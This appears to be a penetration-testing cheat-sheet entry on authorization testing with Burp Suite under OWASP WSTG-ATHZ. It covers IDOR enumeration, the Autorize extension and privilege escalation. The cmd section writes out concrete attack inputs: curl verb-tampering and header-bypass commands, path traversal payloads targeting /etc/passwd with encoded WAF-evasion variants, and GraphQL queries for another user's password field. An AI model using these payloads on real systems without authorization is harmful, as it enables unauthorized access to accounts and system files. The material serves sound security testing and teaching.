title: Burp AuthZ — WSTG-ATHZ: IDOR, Privilege Escalation, Access Control
body: WSTG-ATHZ covers 4 tests (ATHZ-01 to ATHZ-04) plus OAuth (ATHZ-05). IDOR is the highest-rewarded vulnerability class in bug bounty programs in 2025-2026. Authorization testing is 100% manual — every request is valid HTTP, only context makes it abuse. Autorize automates replay across privilege levels; you supply the judgment. The key tests: IDOR with sequential ID enumeration, Autorize for scale, verb tampering, header-based bypass, and API endpoint access.
cmd:
# ══ ⭐ AUTHZ TESTING — all manual, scanner-blind ══════════════════════
# WSTG-ATHZ-01: Directory Traversal / LFI
# WSTG-ATHZ-02: Bypass Authorization Schema
# WSTG-ATHZ-03: Privilege Escalation
# WSTG-ATHZ-04: IDOR
# Scanners cannot find these — every request is valid HTTP.
# Only context makes it abuse. You supply the logic.

# 1) IDOR — Insecure Direct Object Reference (WSTG-ATHZ-04)
# THE HIGHEST-BOUNTY VULNERABILITY CLASS IN 2025-2026 (OWASP/HackerOne data)
# Look for any user-controlled ID/reference in any request:
#   URL path:     /users/2/profile  /orders/1043  /files/report.pdf
#   Query param:  ?id=2  ?user_id=42  ?account=ABC123
#   JSON body:    {"user_id":2}  {"order_id":1043}
#   Header:       X-User-ID: 2
# HORIZONTAL IDOR: same role, different user
#   user_id=2 -> try 1, 3, 4, 5 -> can you access another user's data?
# VERTICAL IDOR: lower role accessing higher-role resources
#   regular user accessing /admin/users, /api/admin/reports
# INDIRECT IDOR: hash or UUID instead of sequential int
#   GET /api/docs/abc123def456 -> try another user's doc hash
#   Hash IDs are NOT security — if the ID is guessable or enumerable it's still IDOR
# Intruder for sequential ID enumeration:
#   Position on the numeric ID -> payload type: Numbers (1 to 9999, step 1)
#   Sort by length -> non-empty responses = valid records -> IDOR confirmed

# 2) AUTORIZE — automate IDOR detection at scale
# Install Autorize (BApp Store)
# Workflow:
#   a. Log in as USER A (high privilege / victim). Browse normally.
#   b. Log in as USER B (low privilege / attacker) in a different browser.
#   c. Copy USER B's Cookie header value.
#   d. Autorize -> Interception Filters -> set to USER B's Cookie value.
#   e. Browse as USER A. Autorize replays EVERY request as USER B automatically.
#   f. Results:
#      Green (Enforced)   = USER B got a different response -> access control works
#      Red (Bypassed!)    = USER B got the SAME response -> IDOR confirmed
#      Yellow (Modified)  = response changed but similar -> needs manual check
# Confirm: take any Red item -> right-click -> Send to Repeater -> verify manually
# Also test with NO session cookie at all (unauthenticated access):
#   Autorize -> set cookie to empty string -> re-browse -> unauthenticated IDOR

# 3) PRIVILEGE ESCALATION (WSTG-ATHZ-03)
# Vertical: regular user accessing admin functions
# Find admin paths from recon: /admin/* /api/admin/* /manage/* /internal/*
# Test while logged in as regular user -> does the server check the role?
# Parameter-based role: role=user -> change to role=admin, role=0 -> role=1
# Function-level: PUT /api/users/2 (admin-only) -> try as regular user
# In Repeater: swap your low-priv cookie for a high-priv endpoint request

# 4) AUTHORIZATION BYPASS SCHEMA (WSTG-ATHZ-02)
# HTTP verb tampering: app checks POST but not GET (or vice versa)
curl -X GET http://$ip/admin/deleteUser    # if POST /admin/deleteUser is 403
curl -X PUT http://$ip/admin/users/2
curl -X PATCH http://$ip/admin/settings
# Path confusion bypass:
# /admin/secret -> 403, but /admin/../admin/secret -> 200?
# /admin/secret -> 403, but /ADMIN/secret -> 200? (case sensitivity)
# /admin/secret -> 403, but /admin/secret/ -> 200? (trailing slash)
# Header bypass (misconfigured reverse proxy or WAF):
curl -H "X-Original-URL: /admin" http://$ip/     # some frameworks route on this
curl -H "X-Rewrite-URL: /admin" http://$ip/
curl -H "X-Forwarded-For: 127.0.0.1" http://$ip/admin  # localhost whitelist bypass
# Content-type switch: app validates JSON body but not form-encoded body
# Change Content-Type: application/json to application/x-www-form-urlencoded
# and convert JSON to form params -> may bypass body-based ACL check

# 5) DIRECTORY TRAVERSAL / PATH TRAVERSAL (WSTG-ATHZ-01)
# In any file parameter: file=, path=, page=, document=, img=
../../../etc/passwd
....//....//....//etc/passwd        # double-slash bypass
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd    # URL encoded
%252e%252e%252f                     # double URL encoded (WAF bypass)
..%2F..%2F..%2Fetc%2Fpasswd
# Test in URL path too: /files/../../../etc/passwd
# Full LFI exploitation -> lfi node

# 6) API AUTHORIZATION (WSTG-APIT)
# REST APIs often have IDOR in endpoints like:
GET /api/v1/users/me           -> your profile
GET /api/v1/users/2            -> someone else's profile? IDOR
GET /api/v1/users              -> do you get ALL users? Mass disclosure
PATCH /api/v1/users/2          -> can you update another user's record?
DELETE /api/v1/users/2         -> can you delete any account?
# GraphQL: try introspection (often left on in dev/staging):
{"query":"{__schema{types{name fields{name}}}}"}    # list all types/fields
{"query":"{ user(id:2) { email password role } }"}  # query another user's fields
# Missing field-level auth: server returns fields even if user shouldn't see them
warn: IDOR is the most consistently underreported vulnerability in web app testing because it requires reasoning, not tool output. UUID/hash IDs are NOT security controls — if the ID is enumerable (even indirectly) it's still IDOR. Always test unauthenticated access too (no session cookie at all) — some IDOR requires no auth whatsoever. Autorize is the difference between testing 10 IDOR points manually and covering all 200 endpoints automatically. The Red findings still need manual confirmation in Repeater.
